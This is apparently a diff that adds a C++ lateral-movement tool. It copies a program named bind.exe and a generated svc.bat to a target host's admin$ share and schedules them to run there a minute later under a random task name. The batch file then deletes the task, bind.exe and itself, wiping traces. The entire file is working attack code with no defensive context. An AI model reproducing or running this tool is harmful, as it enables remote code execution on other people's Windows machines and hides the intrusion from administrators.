@@ -1,0 +1,88 @@
+#include <iostream>
+#include <fstream>
+#include <sstream>
+#include <cstdlib>
+#include <ctime>
+#include <cstring>
+
+using namespace std;
+//void sleep(unsigned int);
+void GetNextMinute(ostringstream *);
+
+int main(int argc, char const *argv[])
+{
+    /* code */
+    const char *c = "0123456789abcdefghijklmnopqrstuvwxyz";
+    srand(time(NULL));
+    char randa[10];
+
+    for ( int i=0; i<7; i++) {
+        randa[i] = c[rand()%strlen(c)];
+    }
+
+    char msg[255];
+    cout << "input host name: ";
+    cin >> msg;
+
+    // Produce svc.bat
+    // svc.bat exec bind.exe and delete schtasks
+    ofstream outfile ("svc.bat");
+    if ( outfile.is_open()) {
+        outfile << "bind.exe\nSCHTASKS /DELETE /S " << msg << " /TN " << randa << " /F\ndel bind.exe\ndel svc.bat";
+        cout << "> Create file svc.bat" << endl;
+        outfile.close();
+    } else {
+        exit(1);
+    }
+
+    ostringstream cmd;
+
+    // move bind.exe to admin$
+    cmd << "move bind.exe \\\\" << msg << "\\admin$";
+    system(cmd.str().c_str());
+    cmd.str("");
+
+    // move svc.bat to admin$
+    cmd << "move svc.bat \\\\" << msg << "\\admin$";
+    cout << "> " << cmd.str() << endl; // Test ouput;
+    if ( system(cmd.str().c_str()) ) exit(1);
+    cmd.str("");
+
+    ostringstream time;
+    GetNextMinute(&time);
+
+    // Establishing remote schtasks
+    cmd << "SCHTASKS /CREATE /S " << msg << " /RU User /SC ONCE /TN " << randa << " /TR \"C:\\Windows\\svc.bat\" /ST " << time.str();
+    cout << "> " << cmd.str() << endl; // Test ouput;
+    system(cmd.str().c_str());
+
+    system("pause");
+    return 0;
+}
+void GetNextMinute(ostringstream * s) {
+    
+    time_t timer;
+    time(&timer);
+    timer += 60; //yy->tm_min++;
+    struct tm *yy = localtime(&timer);
+    
+    char buffer[10];
+    strftime(buffer, 10, "%H:%M", yy);
+
+    *s << buffer;
+    // if ( yy->tm_hour < 10 )
+    //    *s << "0" << yy->tm_hour << ":";
+    // else
+    //     *s << yy->tm_hour << ":";
+        
+    // if ( yy->tm_min < 10 )
+    //    *s << "0" << yy->tm_min;
+    // else
+    //     *s << yy->tm_min;
+}
+// void sleep(unsigned int mseconds)
+// {
+//     clock_t goal = mseconds + clock();
+//     while (goal > clock())
+//         ;
+// }
